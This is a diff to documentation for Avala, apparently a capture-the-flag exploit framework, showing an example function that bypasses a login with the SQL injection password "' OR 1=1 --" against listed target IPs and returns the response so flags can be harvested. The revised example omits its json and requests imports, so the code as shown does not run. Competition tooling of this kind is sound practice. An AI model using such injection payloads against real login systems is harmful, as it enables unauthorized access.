@@ -17,26 +17,34 @@ When developing exploits with Avala, you can focus on the core logic of the atta
 
 The following example shows a simple login bypass using a username provided in a flag ID (e.g. `"{\"username\": \"johndoe\"}"`). After a successful login, the flag will be *somewhere* in the response and Avala will pick it up for submitting.
 
-```py
-from avala import exploit
-import json
-import requests
+```python
+from avala import exploit  # (1)!
 
 
-@exploit(service="wish")
-def attack(target: str, flag_ids: str):
-    url = f"http://{target}:5000/login"
-    username = json.loads(flag_ids)["username"]
+@exploit(
+    service="foobar",  # (2)!
+    targets=["10.10.19.1", "10.10.20.1", "10.10.21.1"],  # (3)!
+)
+def attack(target: str, flag_ids: str):  # (4)!
+    username = json.loads(flag_ids)["username"]  # (5)!
 
-    payload = {
-        "username": username,
-        "password": "' OR 1=1 --",
-    }
+    response = requests.post(  # (6)!
+        f"http://{target}:5000/login",
+        json={"username": username, "password": "' OR 1=1 --"},
+    )
 
-    response = requests.post(url, json=payload)
-    return response.text
+    return response.text  # (7)!
 ```
+{ .annotate }
+
+1.  :material-import: Import the `@exploit` decorator — you will use it to register and configure your exploit functions.
+2.  :material-cog: Pick the service you want to attack. You will find service names in the _flag IDs_ or by running `avl services`.  
+3.  :material-target: Aim at specific teams, or let Avala get all the targets automatically. :magic_wand:
+4.  :fontawesome-solid-brain: Avala plugs in the target IP and flag IDs. You handle the fun part.
+5.  :bulb: Flag IDs come in different types and sizes. This service returns a stringified JSON `"{\"username\": \"johndoe\"}"`.
+6.  :sparkles: Just the exploit itself, nothing extra. 
+7.  :triangular_flag_on_post: Just return the whole string. Or a list, a dict, or _anything really_.<br><br>As long as its string representation _contains_ a flag (or multiple), Avala will extract it and submit it for you.
 
 ---
 
-To get started, first you will need to prepare your workspace and [install Avala library](./setup.md). 🚀
+To get started, first you will need to prepare your workspace and [install the Avala library](./setup.md). 🚀
